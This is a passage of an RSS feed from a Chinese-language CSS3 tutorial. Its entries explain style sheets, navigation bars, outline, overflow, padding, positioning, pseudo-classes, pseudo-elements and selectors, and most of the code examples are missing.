<p>外部样式表可以在任何文本编辑器中编写，并且必须以 <code>.css</code> 扩展名保存</p>
<p>外部 <code>.css</code> 文件不应包含任何 HTML 标签</p>
<p>请勿在 <strong>属性值</strong> 和 <strong>单位</strong> 之间添加空格（例如：<code>margin-left: 20px;</code>）。正确的写法是：（<code>margin-left: 20px;</code>）</p>
</div>
<h2> 内部 CSS</h2>
<p>如果一张 HTML 页面拥有 <strong>唯一</strong> 的样式，那么可以使用 <strong>内部样式表。</strong></p>
<p>内部样式是在 <code>head</code> 部分的 <code>&lt;style&gt;</code> 元素中进行定义。</p>
<p>内部样式在 HTML 页面的 <code>&lt;head&gt;</code> 部分内的 <code>&lt;style&gt;</code> 元素中进行定义。例如：</p>

<h2> 行内 CSS</h2>
<p><strong>行内样式</strong>（也称内联样式）可用于为单个元素应用唯一的样式。</p>
<p>使用行内样式将 <code>style</code> 属性添加到相关元素。<code>style</code> 属性 <strong>可包含</strong> 任何 <code>CSS</code> 属性。</p>
<p>行内样式在相关元素的 <code>style</code> 属性中定义。例如：</p>

<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>行内样式失去了样式表的许多优点（通过将内容与呈现混合在一起）。请谨慎使用此方法</p>
</div>
<h2> 多个样式表</h2>
<p>在不同样式表中为同一选择器（元素）定义了一些属性，则将使用最后读取的样式表中的值。</p>
<p>例如：</p>
<p>某个外部样式表为 <code>&lt;h1&gt;</code> 元素设定的如下样式：</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后，某个内部样式表也为 <code>&lt;h1&gt;</code> 元素设置了如下样式：</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li>
<p>如果内部样式是在链接到外部样式表之后定义的，则应用 <strong>内部样式</strong></p>

</li>
<li>
<p>如果在链接到外部样式表之前定义了内部样式，则应用 <strong>外部样式</strong></p>

</li>
</ul>
<h2> 层叠顺序</h2>
<p>当为某个 HTML 元素指定了多个样式时，会使用哪种样式呢？</p>
<p>页面中的所有样式将按照以下规则 <strong>层叠</strong> 为新的 <strong>虚拟</strong> 样式表，其中优先级从上到下依次降低：</p>
<ol>
<li>行内样式（在 HTML 元素中）</li>
<li>外部和内部样式表（在 head 部分）</li>
<li>浏览器默认样式</li>
</ol>
<p>行内样式具有最高优先级，并且将覆盖外部和内部样式以及浏览器默认样式。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>导航栏</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/navbar.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/navbar.html</guid>
      <source url="https://sankgao.github.io/rss.xml">导航栏</source>
      <description>易用的导航对于任何网站都很重要。 通过使用 CSS，您可以将无聊的 HTML 菜单转换为美观的导航栏。 导航栏 = 链接列表 导航栏需要标准 HTML 作为基础。 在实例中，将用标准的 HTML 列表构建导航栏。 导航栏基本上就是链接列表，因此使用 和 元素会很有意义。例如： 演示 现在，从列表中删除项目符号以及外边距和内边距（填充）。例如： 演示 垂...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>易用的导航对于任何网站都很重要。</p>
<p>通过使用 CSS，您可以将无聊的 HTML 菜单转换为美观的导航栏。</p>
<h2> 导航栏 = 链接列表</h2>
<p>导航栏需要标准 HTML 作为基础。</p>
<p>在实例中，将用标准的 HTML 列表构建导航栏。</p>
<p>导航栏基本上就是链接列表，因此使用 <code>&lt;ul&gt;</code> 和 <code>&lt;li&gt;</code> 元素会很有意义。例如：</p>

<p>现在，从列表中删除项目符号以及外边距和内边距（填充）。例如：</p>

<h2> 垂直导航栏</h2>
<p>创建背景色为灰色的基础垂直导航栏，并在用户将鼠标移到链接上时改变链接的背景色。例如：</p>

<ul>
<li><strong>display: block;</strong>：将链接显示为块元素可以使整个链接区域都可以被单击（而不仅仅是文本）</li>
</ul>
<h3> 活动或当前的导航链接</h3>
<p>向当前链接添加 <code>active</code> 类，以使用户知道他在哪个页面上。例如：</p>

<h3> 居中链接以及添加边框</h3>
<p>把 <code>text-align: center</code> 添加到 <code>&lt;li&gt;</code> 或 <code>&lt;a&gt;</code>，使链接居中。</p>
<p>将 <code>border</code> 属性添加到 <code>&lt;ul&gt;</code>，在导航栏周围添加边框。如果您还希望在导航栏内添加边框，请为所有 <code>&lt;li&gt;</code> 元素添加 <code>border-bottom</code>，最后一个元素除外。例如：</p>

<h3> 全高固定垂直导航栏</h3>
<p>创建全高的 “粘性” 侧面导航。例如：</p>

<h2> 水平导航栏</h2>
<p>有两种创建水平导航栏的方法：使用行内或浮动列表项。</p>
<h3> 行内列表项</h3>
<p>构建水平导航栏的一种方法是，需要将 <code>&lt;li&gt;</code> 元素指定为 <code>inline</code>。例如：</p>

<ul>
<li><strong>display: inline;</strong>：默认情况下，<code>&lt;li&gt;</code> 元素是块元素。在这里，需要删除每个列表项之前和之后的换行符，这样它们才能显示在一行。</li>
</ul>
<h3> 浮动列表项</h3>
<p>创建水平导航栏的另一种方法是浮动 <code>&lt;li&gt;</code> 元素，并为导航链接规定布局。例如：</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>如需全宽的背景色，请将 <code>background-color</code> 添加到 <code>&lt;ul&gt;</code> 而不是每个 <code>&lt;a&gt;</code> 元素</p>
</div>
<h3> 水平导航栏实例</h3>
<ul>
<li>
<p>基础水平导航栏</p>
<p>创建具有深色背景色的基础水平导航栏，并在用户将鼠标移到链接上方时改变链接的背景色。例如：</p>

</li>
<li>
<p>活动或当前的导航链接</p>
<p>向当前链接添加 <code>active</code> 类，这样用户就知道他在哪个页面上。例如：</p>

</li>
<li>
<p>右对齐链接</p>
<p>通过将列表项向右浮动来右对齐链接（<code>float: right;</code>）。例如：</p>

</li>
<li>
<p>边框分隔栏</p>
<p>将 <code>border-right</code> 属性添加到 <code>&lt;li&gt;</code>，以创建链接分隔符。例如：</p>

</li>
<li>
<p>固定的导航栏</p>
<p>使导航栏保持在页面的顶部或底部，即使用户滚动页面也是如此。例如：</p>

</li>
<li>
<p>粘性导航栏</p>
<p>为 <code>&lt;ul&gt;</code> 添加 <code>position: sticky;</code>，以创建粘性导航栏。</p>
<p>粘性元素会根据滚动位置在相对和固定之间切换。它是相对定位的，直到在视口中遇到给定的偏移位置为止，然后将其 “粘贴” 在适当的位置（比如：<code>position: fixed</code>）。例如：</p>

</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>轮廓</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/outline.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/outline.html</guid>
      <source url="https://sankgao.github.io/rss.xml">轮廓</source>
      <description>轮廓 是在元素周围绘制的一条线，在边框之外，以凸显元素。 CSS 拥有如下轮廓属性： outline-style：规定轮廓的样式; outline-color：规定轮廓的颜色; outline-width：规定轮廓的宽度; outline-offset：对轮廓进行偏移; outline：是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p><strong>轮廓</strong> 是在元素周围绘制的一条线，在边框之外，以凸显元素。</p>
<p>CSS 拥有如下轮廓属性：</p>
<ul>
<li><strong>outline-style</strong>：规定轮廓的样式</li>
<li><strong>outline-color</strong>：规定轮廓的颜色</li>
<li><strong>outline-width</strong>：规定轮廓的宽度</li>
<li><strong>outline-offset</strong>：对轮廓进行偏移</li>
<li><strong>outline</strong>：是绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">轮廓与边框不同</p>
<p>不同之处在于：轮廓是在元素边框之外绘制的，并且可能与其他内容重叠。同样，轮廓也不是元素尺寸的一部分；元素的总宽度和高度不受轮廓线宽度的影响</p>
</div>
<h2> 轮廓样式</h2>
<p><code>outline-style</code> 属性指定轮廓的样式，并可设置如下值：</p>
<ul>
<li><strong>dotted</strong>：定义点状的轮廓</li>
<li><strong>dashed</strong>：定义虚线的轮廓</li>
<li><strong>solid</strong>：定义实线的轮廓</li>
<li><strong>double</strong>：定义双线的轮廓</li>
<li><strong>groove</strong>：定义 3D 凹槽轮廓</li>
<li><strong>ridge</strong>：定义 3D 凸槽轮廓</li>
<li><strong>inset</strong>：定义 3D 凹边轮廓</li>
<li><strong>outset</strong>：定义 3D 凸边轮廓</li>
<li><strong>none</strong>：定义无轮廓</li>
<li><strong>hidden</strong>：定义隐藏的轮廓</li>
</ul>
<p>例如：</p>

<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>除非设置了 <code>outline-style</code> 属性，否则其他轮廓属性都不会有任何作用</p>
</div>
<h2> 轮廓宽度</h2>
<p><code>outline-width</code> 属性指定轮廓的宽度，并可设置如下值之一：</p>
<ul>
<li><code>thin</code>（通常为 1px）</li>
<li><code>medium</code>（通常为 3px）</li>
<li><code>thick</code> （通常为 5px）</li>
<li>特定尺寸（以 <code>px</code>、<code>pt</code>、<code>cm</code>、<code>em</code> 计）</li>
</ul>
<p>例如：</p>

<h2> 轮廓颜色</h2>
<p><code>outline-color</code> 属性用于设置轮廓的颜色。</p>
<p>可以通过以下方式设置颜色：</p>
<ul>
<li><strong>name</strong>：指定颜色名。比如：<code>red</code></li>
<li><strong>HEX</strong>：指定十六进制。比如：<code>#ff0000</code></li>
<li><strong>RGB</strong>：指定 RGB 值。比如：<code>rgb(255,0,0)</code></li>
<li><strong>HSL</strong>：指定 HSL 值。比如：<code>hsl(0, 100%, 50%)</code></li>
<li><strong>invert</strong>：执行颜色反转（确保轮廓可见，无论是什么颜色背景）</li>
</ul>
<p>例如：</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>这些元素在轮廓内还有黑色细边框</p>
</div>
<h3> HEX 值</h3>
<p>也可以使用十六进制值（HEX）指定轮廓颜色。例如：</p>

<h3> RGB 值</h3>
<p>或者通过使用 RGB 值。例如：</p>

<h3> HSL 值</h3>
<p>还可以使用 HSL 值。例如：</p>

<h3> 反转颜色</h3>
<p>使用 <code>outline-color: invert</code>，执行了颜色反转。这样可以确保无论颜色背景如何，轮廓都是可见的。例如：</p>

<h2> 轮廓简写</h2>
<p><code>outline</code> 属性是用于设置以下各个轮廓属性的简写属性：</p>
<ul>
<li><strong>outline-width</strong></li>
<li><strong>outline-style</strong>（必需）</li>
<li><strong>outline-color</strong></li>
</ul>
<p>从上面的列表中，outline 属性可指定一个、两个或三个值。值的顺序无关紧要。</p>
<p>例如：</p>

<h2> 轮廓偏移</h2>
<p><code>outline-offset</code> 属性在元素的轮廓与边框之间添加空间。元素及其轮廓之间的空间是透明的。</p>
<p>例如：指定边框边缘外 <code>25px</code> 的轮廓。</p>

]]></content:encoded>
    </item>
    <item>
      <title>溢出</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/overflow.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/overflow.html</guid>
      <source url="https://sankgao.github.io/rss.xml">溢出</source>
      <description>CSS overflow 属性控制对太大而区域无法容纳的内容的处理方式。例如： 演示 CSS Overflow overflow 属性指定在元素的内容太大而无法放入指定区域时是 剪裁内容 还是 添加滚动条。 overflow 属性可设置以下值： visible：默认。溢出没有被剪裁。内容在元素框外渲染; hidden：溢出被剪裁，其余内容将不可见; s...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS <code>overflow</code> 属性控制对太大而区域无法容纳的内容的处理方式。例如：</p>

<h2> CSS Overflow</h2>
<p><code>overflow</code> 属性指定在元素的内容太大而无法放入指定区域时是 <strong>剪裁内容</strong> 还是 <strong>添加滚动条。</strong></p>
<p><code>overflow</code> 属性可设置以下值：</p>
<ul>
<li><strong>visible</strong>：默认。溢出没有被剪裁。内容在元素框外渲染</li>
<li><strong>hidden</strong>：溢出被剪裁，其余内容将不可见</li>
<li><strong>scroll</strong>：溢出被剪裁，同时添加滚动条以查看其余内容</li>
<li><strong>auto</strong>：与 <code>scroll</code> 类似，但仅在必要时添加滚动条</li>
</ul>
<p><code>overflow</code> 属性仅适用于具有指定高度的块元素。</p>
<p>在 OS X Lion（Mac）中，滚动条默认情况下是隐藏的，并且仅在使用时显示（即使设置了 <code>overflow: scroll</code>）。</p>
<h2> overflow: visible</h2>
<p>默认情况下，溢出是可见的（<code>visible</code>），这意味着它不会被裁剪，而是在元素框外渲染。例如：</p>

<h2> overflow: hidden</h2>
<p>如果使用 <code>hidden</code> 值，溢出会被裁剪，其余内容被隐藏。例如：</p>

<h2> overflow: scroll</h2>
<p>如果将值设置为 <code>scroll</code>，溢出将被裁剪，并添加滚动条以便在框内滚动。例如：</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>这将在水平和垂直方向上添加一个滚动条（即使您不需要它）</p>
</div>
<h2> overflow: auto</h2>
<p><code>auto</code> 值类似于 <code>scroll</code>，但是它仅在必要时添加滚动条。例如：</p>

<h2> overflow-x 和 overflow-y</h2>
<p><code>overflow-x</code> 和 <code>overflow-y</code> 属性规定是仅水平还是垂直地（或同时）更改内容的溢出：</p>
<ul>
<li><strong>overflow-x</strong>：指定如何处理内容的左或右边缘</li>
<li><strong>overflow-y</strong>：指定如何处理内容的上或下边缘</li>
</ul>
<p>例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>内边距</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/padding.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/padding.html</guid>
      <source url="https://sankgao.github.io/rss.xml">内边距</source>
      <description>CSS padding 属性用于在任何定义的边界内的元素内容周围生成空间。 通过 CSS，您可以完全控制内边距（填充）。有一些属性可以为元素的每一侧（上、右、下和左侧）设置内边距。 单独的边 CSS 拥有用于为元素的每一侧指定内边距的属性： padding-top：上内边距; padding-right：右内边距; padding-bottom：下内边...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS <code>padding</code> 属性用于在任何定义的边界内的元素内容周围生成空间。</p>
<p>通过 CSS，您可以完全控制内边距（填充）。有一些属性可以为元素的每一侧（上、右、下和左侧）设置内边距。</p>
<h2> 单独的边</h2>
<p>CSS 拥有用于为元素的每一侧指定内边距的属性：</p>
<ul>
<li><strong>padding-top</strong>：上内边距</li>
<li><strong>padding-right</strong>：右内边距</li>
<li><strong>padding-bottom</strong>：下内边距</li>
<li><strong>padding-left</strong>：左内边距</li>
</ul>
<p>所有内边距属性都可以设置以下值：</p>
<ul>
<li><strong>length</strong>：以 <code>px</code>、<code>pt</code>、<code>cm</code> 等单位指定内边距</li>
<li><strong>%</strong>：指定以包含元素宽度的百分比计的内边距</li>
<li><strong>inherit</strong>：指定应从父元素继承内边距</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>不允许负值</p>
</div>
<p>为四个边设置不同的内边距。例如：</p>

<h3> 简写属性</h3>
<p>为了缩减代码，可以在一个属性中指定所有内边距属性。</p>
<p><code>padding</code> 属性是以下各内边距属性的简写属性：</p>
<ul>
<li><code>padding-top</code></li>
<li><code>padding-right</code></li>
<li><code>padding-bottom</code></li>
<li><code>padding-left</code></li>
</ul>
<ol>
<li>
<p><code>padding</code> 属性设置四个值。例如：</p>

</li>
<li>
<p><code>padding</code> 属性设置三个值。例如：</p>

</li>
<li>
<p><code>padding</code> 属性设置两个值。例如：</p>

</li>
<li>
<p><code>padding</code> 属性设置一个值。例如：</p>

</li>
</ol>
<h3> 内边距和元素宽度</h3>
<p>CSS <code>width</code> 属性指定元素内容区域的 <strong>宽度</strong>。内容区域是元素（盒模型）的内边距、边框和外边距内的部分。</p>
<p>因此，如果元素拥有指定的宽度，则添加到该元素的内边距会添加到元素的总宽度中。这通常是不希望的结果。</p>
<p>例如：<code>&lt;div&gt;</code> 元素的宽度为 <code>300px</code>。但是，<code>&lt;div&gt;</code> 元素的实际宽度将是 <code>350px</code>（300px + 左内边距 25px + 右内边距 25px）。</p>

<p>若要将宽度保持为 <code>300px</code>，无论填充量如何，那么您可以使用 <code>box-sizing</code> 属性。这将导致元素保持其宽度。如果增加内边距，则可用的内容空间会减少。</p>
<p>例如：使用 <code>box-sizing</code> 属性将宽度保持为 <code>300px</code>，无论填充量如何。</p>

]]></content:encoded>
    </item>
    <item>
      <title>定位</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/positioning.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/positioning.html</guid>
      <source url="https://sankgao.github.io/rss.xml">定位</source>
      <description>position 属性规定应用于元素的定位方法的类型。 有五个不同的位置值： static; relative; fixed; absolute; sticky; 元素其实是使用 top、`bottom、left 以及 right 属性定位的。但是，除非首先设置了 position 属性，否则这些属性将不起作用。根据不同的 position 值，它们的...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p><code>position</code> 属性规定应用于元素的定位方法的类型。</p>
<p>有五个不同的位置值：</p>
<ul>
<li><strong>static</strong></li>
<li><strong>relative</strong></li>
<li><strong>fixed</strong></li>
<li><strong>absolute</strong></li>
<li><strong>sticky</strong></li>
</ul>
<p>元素其实是使用 <code>top</code>、<code>bottom</code>、<code>left</code> 以及 <code>right</code> 属性定位的。但是，除非首先设置了 <code>position</code> 属性，否则这些属性将不起作用。根据不同的 <code>position</code> 值，它们的工作方式也不同。</p>
<h2> position: static;</h2>
<p>HTML 元素默认情况下的定位方式为 static（静态）。</p>
<p>静态定位的元素不受 <code>top</code>、<code>bottom</code>、<code>left</code> 以及 <code>right</code> 属性的影响。</p>
<p><code>position: static;</code> 的元素不会以任何特殊方式定位；它始终根据页面的正常流进行定位。例如：</p>

<h2> position: relative;</h2>
<p><code>position: relative;</code> 的元素相对于其正常位置进行定位。</p>
<p>设置相对定位的元素的 <code>top</code>、<code>bottom</code>、<code>left</code> 以及 <code>right</code> 属性将导致其偏离其正常位置进行调整。不会对其余内容进行调整来适应元素留下的任何空间。例如：</p>

<h2> position: fixed;</h2>
<p><code>position: fixed;</code> 的元素是相对于视口定位的，这意味着即使滚动页面，它也始终位于同一位置。<code>top</code>、<code>bottom</code>、<code>left</code> 以及 <code>right</code> 属性用于定位此元素。</p>
<p>固定定位的元素不会在页面中通常在放置的位置上留出空隙。</p>
<p>请注意页面右下角的这个固定元素。例如：</p>

<h2> position: absolute;</h2>
<p><code>position: absolute;</code> 的元素相对于最近的定位祖先元素进行定位（而不是相对于视口定位。如：<code>fixed</code>）。</p>
<p>然而，如果绝对定位的元素没有祖先，它将使用文档主体（body），并随页面滚动一起移动。</p>
<div class="hint-container tip">
<p class="hint-container-title">被定位的元素</p>
<p>被定位的元素是其位置除 <code>static</code> 以外的任何元素</p>
</div>
<p>例如：</p>

<h2> position: sticky;</h2>
<p><code>position: sticky;</code> 的元素根据用户的滚动位置进行定位。</p>
<p>粘性元素根据滚动位置在相对（<code>relative</code>）和固定（<code>fixed</code>）之间切换。起先它会被相对定位，直到在视口中遇到给定的偏移位置为止，然后将其 “粘贴” 在适当的位置（比如：<code>position:fixed</code>）。</p>
<p>在到达其滚动位置时，<code>sticky</code> 元素将停留在页面顶部（<code>top: 0</code>）。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>Internet Explorer、Edge 15 以及更早的版本不支持粘性定位。Safari 需要 <code>-webkit-</code> 前缀。您还必须至少指定 <code>top</code>、<code>right</code>、<code>bottom</code> 或 <code>left</code> 之一，以便粘性定位起作用。</p>
</div>
<h2> 重叠元素</h2>
<p>在对元素进行定位时，它们可以与其他元素重叠。</p>
<p><code>z-index</code> 属性指定元素的堆栈顺序（哪个元素应放置在其他元素的前面或后面）。</p>
<p>元素可以设置正或负的堆叠顺序。例如：</p>

<p>具有较高堆叠顺序的元素始终位于具有较低堆叠顺序的元素之前。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果两个定位的元素重叠而未指定 z-index，则位于 HTML 代码中最后的元素将显示在顶部</p>
</div>
<h2> 定位图像中的文本</h2>
<p>例如：</p>

<h2> 设置元素的形状</h2>
<p>元素被裁剪为这种形状并显示。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>伪类</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/pseudo_classes.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/pseudo_classes.html</guid>
      <source url="https://sankgao.github.io/rss.xml">伪类</source>
      <description>伪类用于定义元素的特殊状态。 可以用于： 设置鼠标悬停在元素上时的样式; 为已访问和未访问链接设置不同的样式; 设置元素获得焦点时的样式; 语法 伪类的语法： selector：选择器; pseudo-class：伪类; property：属性; value：值; 锚伪类 链接能够以不同的方式显示。例如： 演示 a:hover 必须在 CSS 定义中的...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>伪类用于定义元素的特殊状态。</p>
<p>可以用于：</p>
<ul>
<li>设置鼠标悬停在元素上时的样式</li>
<li>为已访问和未访问链接设置不同的样式</li>
<li>设置元素获得焦点时的样式</li>
</ul>
<h2> 语法</h2>
<p>伪类的语法：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>selector</strong>：选择器</li>
<li><strong>pseudo-class</strong>：伪类</li>
<li><strong>property</strong>：属性</li>
<li><strong>value</strong>：值</li>
</ul>
<h2> 锚伪类</h2>
<p>链接能够以不同的方式显示。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<ul>
<li><code>a:hover</code> 必须在 CSS 定义中的 <code>a:link</code> 和 <code>a:visited</code> 之后，才能生效</li>
<li><code>a:active</code> 必须在 CSS 定义中的 <code>a:hover</code> 之后才能生效</li>
<li>伪类名称对大小写不敏感</li>
</ul>
</div>
<h3> 伪类和 CSS 类</h3>
<p>伪类可以与 CSS 类结合使用。</p>
<p>例如：当您将鼠标悬停在例子中的链接上时，它会改变颜色。</p>

<h3> 悬停在 &lt;div&gt; 上</h3>
<p>在 <code>&lt;div&gt;</code> 元素上使用 <code>:hover</code> 伪类的实例。例如：</p>

<h3> 简单的工具提示悬停</h3>
<p>把鼠标悬停到 <code>&lt;div&gt;</code> 元素以显示 <code>&lt;p&gt;</code> 元素（类似工具提示的效果）。例如：</p>

<h2> :first-child 伪类</h2>
<p><code>:first-child</code> 伪类与指定的元素匹配：该元素是另一个元素的第一个子元素。</p>
<p>选择器匹配作为任何元素的第一个子元素的任何 <code>&lt;p&gt;</code> 元素。例如：</p>

<h3> 匹配所有 &lt;p&gt; 元素中的首个 &lt;i&gt; 元素</h3>
<p>选择器匹配所有 <code>&lt;p&gt;</code> 元素中的第一个 <code>&lt;i&gt;</code> 元素。例如：</p>

<h3> 匹配所有首个 &lt;p&gt; 元素中的所有 &lt;i&gt; 元素</h3>
<p>选择器匹配作为另一个元素的第一个子元素的 <code>&lt;p&gt;</code> 元素中的所有 <code>&lt;i&gt;</code> 元素。例如：</p>

<h2> :lang 伪类</h2>
<p><code>:lang</code> 伪类允许您为不同的语言定义特殊的规则。</p>
<p><code>:lang</code> 为属性为 <code>lang="en"</code> 的 <code>&lt;q&gt;</code> 元素定义引号。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>伪元素</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/pseudo_elements.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/pseudo_elements.html</guid>
      <source url="https://sankgao.github.io/rss.xml">伪元素</source>
      <description>CSS 伪元素用于设置元素指定部分的样式。 它可用于： 设置元素的首字母、首行的样式; 在元素的内容之前或之后插入内容; 语法 伪元素的语法： selector：选择器; pseudo-element：伪类; property：属性; value：值; ::first-line 伪元素 ::first-line 伪元素用于向文本的首行添加特殊样式。 例...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 伪元素用于设置元素指定部分的样式。</p>
<p>它可用于：</p>
<ul>
<li>设置元素的首字母、首行的样式</li>
<li>在元素的内容之前或之后插入内容</li>
</ul>
<h2> 语法</h2>
<p>伪元素的语法：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>selector</strong>：选择器</li>
<li><strong>pseudo-element</strong>：伪类</li>
<li><strong>property</strong>：属性</li>
<li><strong>value</strong>：值</li>
</ul>
<h3> ::first-line 伪元素</h3>
<p><code>::first-line</code> 伪元素用于向文本的首行添加特殊样式。</p>
<p>例如：为所有 <code>&lt;p&gt;</code> 元素中的首行添加样式。</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>::first-line</code> 伪元素只能应用于块级元素</p>
<p>以下属性适用于 ::first-line 伪元素：</p>
<ul>
<li>字体属性</li>
<li>颜色属性</li>
<li>背景属性</li>
<li>word-spacing</li>
<li>letter-spacing</li>
<li>text-decoration</li>
<li>vertical-align</li>
<li>text-transform</li>
<li>line-height</li>
<li>clear</li>
</ul>
</div>
<p>在 CSS3 中，双冒号取代了伪元素的单冒号表示法。这是 W3C 试图区分伪类和伪元素的尝试。</p>
<p>在 CSS2 和 CSS1 中，伪类和伪元素都使用了单冒号语法。</p>
<p>为了向后兼容，CSS2 和 CSS1 伪元素可接受单冒号语法。</p>
<h3> ::first-letter 伪元素</h3>
<p><code>::first-letter</code> 伪元素用于向文本的首字母添加特殊样式。</p>
<p>例如：设置所有 <code>&lt;p&gt;</code> 元素中文本的首字母格式。</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>::first-letter</code> 伪元素只能应用于块级元素</p>
<p>以下属性适用于 ::first-letter 伪元素：</p>
<ul>
<li>字体属性</li>
<li>颜色属性</li>
<li>背景属性</li>
<li>外边距属性</li>
<li>内边距属性</li>
<li>边框属性</li>
<li>text-decoration</li>
<li>vertical-align（仅当 "float" 为 "none"）</li>
<li>text-transform</li>
<li>line-height</li>
<li>float</li>
<li>clear</li>
</ul>
</div>
<h2> 伪元素和 CSS 类</h2>
<p>伪元素可以与 CSS 类结合使用。</p>
<p>例如：将以红色和较大的字体显示 <code>class="intro"</code> 的段落的首字母。</p>

<h2> 多个伪元素</h2>
<p>也可以组合几个伪元素。</p>
<p>例如：段落的第一个字母将是红色，字体大小为 <code>xx-large</code>。第一行的其余部分将变为蓝色，并使用小型大写字母。该段的其余部分将是默认的字体大小和颜色。</p>

<h2> 其他伪元素</h2>
<h3> ::before 伪元素</h3>
<p><code>::before</code> 伪元素可用于在元素内容之前插入一些内容。</p>
<p>例如：在每个 <code>&lt;h1&gt;</code> 元素的内容之前插入一幅图像。</p>

<ul>
<li><strong>content</strong>：属性用于定义元素之前或之后放置的生成内容</li>
</ul>
<h3> ::after 伪元素</h3>
<p><code>::after</code> 伪元素可用于在元素内容之后插入一些内容。</p>
<p>例如：在每个 <code>&lt;h1&gt;</code> 元素的内容之后插入一幅图像。</p>

<h3> ::selection 伪元素</h3>
<p><code>::selection</code> 伪元素匹配用户选择的元素部分。</p>
<p>以下 CSS 属性可以应用于 <code>::selection</code>：</p>
<ul>
<li>color</li>
<li>background</li>
<li>cursor</li>
<li>outline</li>
</ul>
<p>例如：所选文本在黄色背景上显示为红色。</p>

]]></content:encoded>
    </item>
    <item>
      <title>选择器</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/selectors.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/selectors.html</guid>
      <source url="https://sankgao.github.io/rss.xml">选择器</source>
      <description>CSS 选择器用于 “查找”（或选取）要设置样式的 HTML 元素。 可以将 CSS 选择器分为五类： 简单选择器（根据名称、id、类来选取元素）; 组合器选择器（根据它们之间的特定关系来选取元素）; 伪类选择器（根据特定状态选取元素）; 伪元素选择器（选取元素的一部分并设置其样式）; 属性选择器（根据属性或属性值来选取元素）; 以下为简单选择器 CS...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 选择器用于 “查找”（或选取）要设置样式的 HTML 元素。</p>
<p>可以将 CSS 选择器分为五类：</p>
<ul>
<li><strong>简单选择器</strong>（根据名称、id、类来选取元素）</li>
<li><strong>组合器选择器</strong>（根据它们之间的特定关系来选取元素）</li>
<li><strong>伪类选择器</strong>（根据特定状态选取元素）</li>
<li><strong>伪元素选择器</strong>（选取元素的一部分并设置其样式）</li>
<li><strong>属性选择器</strong>（根据属性或属性值来选取元素）</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>以下为简单选择器</p>
</div>
<h2> CSS 元素选择器</h2>
<p><strong>元素选择器</strong> 根据 <strong>元素名称</strong> 来选择 HTML 元素。例如：</p>
<p>所有 <code>&lt;p&gt;</code> 元素都将居中对齐，并带有红色文本颜色。</p>

<h2> CSS id 选择器</h2>
<p><strong>id 选择器</strong> 使用 HTML 元素的 <strong>id 属性</strong> 来选择特定元素。</p>
<p>元素的 <code>id</code> 在页面中是唯一的，因此 id 选择器用于选择一个唯一的元素。</p>
<p>要选择具有特定 id 的元素，请写一个井号（<code>#</code>），后跟该元素的 <code>id</code>。例如：</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>id 名称不能以数字开头</p>
</div>
<h2> CSS 类选择器</h2>
